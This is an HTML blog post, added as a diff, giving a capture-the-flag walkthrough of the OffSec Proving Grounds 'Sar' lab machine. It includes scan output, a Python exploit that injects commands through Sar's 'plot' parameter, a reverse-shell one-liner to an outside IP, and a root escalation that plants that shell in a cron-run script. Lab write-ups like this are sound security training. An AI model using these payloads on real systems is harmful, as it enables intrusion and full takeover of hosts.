@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Sar</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Sar | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Sar" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/07/23/Proving_grounds_Play-Sar.html" />
+<meta property="og:url" content="http://localhost:4000/2023/07/23/Proving_grounds_Play-Sar.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-07-23T12:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Sar" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-07-23T12:00:00+05:30","datePublished":"2023-07-23T12:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: Sar","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/07/23/Proving_grounds_Play-Sar.html"},"url":"http://localhost:4000/2023/07/23/Proving_grounds_Play-Sar.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/07/23/Proving_grounds_Play-Sar.html">
+    <h2 class="post-title">Proving grounds Play: Sar</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Jul 23, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">NMAP</h2>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 3340be13cf517dd6a59c64c813e5f29f <span class="o">(</span>RSA<span class="o">)</span>
+|   256 8a4eab0bdee3694050989858328f719e <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e62f551cdbd0bb469280dd5f8ea30a41 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="fuzzing-for-directories-and-files">Fuzzing for Directories and Files</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000069:   200        375 L    964 W      10918 Ch    <span class="s2">"index.html"</span>                           
+000000157:   403        9 L      28 W       279 Ch      <span class="s2">".htaccess"</span>                            
+000000248:   200        1 L      1 W        9 Ch        <span class="s2">"robots.txt"</span>                           
+000000279:   200        1172 L   5873 W     95674 Ch    <span class="s2">"phpinfo.php"</span>
+</code></pre></div></div>
+
+<p><strong>Sar v3.21</strong></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Sar/sar.png" alt="img" /></p>
+
+<h2 id="searchsploit">Searchsploit</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Sar/searchsploit.png" alt="img" /></p>
+
+<h2 id="remote-code-execution">Remote Code Execution</h2>
+
+<p>As per the exploit code the param <code class="language-plaintext highlighter-rouge">plot</code> is vulnerable to remote code execution.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exploiter</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">url</span>
+    <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">session</span><span class="p">()</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="n">sess</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/index.php?plot=;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>       <span class="c1">#vulnerable
+</span>    <span class="k">try</span><span class="p">:</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;option value=(.*?)&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">output</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">Error!!</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">ouut</span> <span class="ow">in</span> <span class="n">out</span><span class="p">:</span>
+        <span class="k">if</span> <span class="sh">"</span><span class="s">There is no defined host...</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ouut</span><span class="p">:</span>
+            <span class="k">if</span> <span class="sh">"</span><span class="s">null selected</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ouut</span><span class="p">:</span>
+                <span class="k">if</span> <span class="sh">"</span><span class="s">selected</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ouut</span><span class="p">:</span>
+                    <span class="nf">print </span><span class="p">(</span><span class="n">ouut</span><span class="p">)</span>
+    <span class="nf">print </span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Python Reverse Shell</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.151",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span>
+</code></pre></div></div>
+
+<h2 id="reverse-shell-obtained">Reverse Shell Obtained</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Sar/local.png" alt="img" /></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Crontab running a cron job every 5 minutes.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Sar/cron.png" alt="img" /></p>
+
+<p>Listing permissions for the script file.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Sar/cron_file.png" alt="img" /></p>
+
+<h3 id="script-contents">Script contents</h3>
+
+<p><strong>Finally.sh</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+./write.sh
+</code></pre></div></div>
+
+<p><strong>write.sh</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+<span class="nb">touch</span> /tmp/gateway
+</code></pre></div></div>
+
+<p>Added python revershell to the <code class="language-plaintext highlighter-rouge">write.sh</code> file, so when the cronjob runs the write.sh file it will runs as <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Sar/write_sh.png" alt="img" /></p>
+
+<h2 id="root-obtained">Root Obtained</h2>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/Sar/root.png" alt="img" /></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
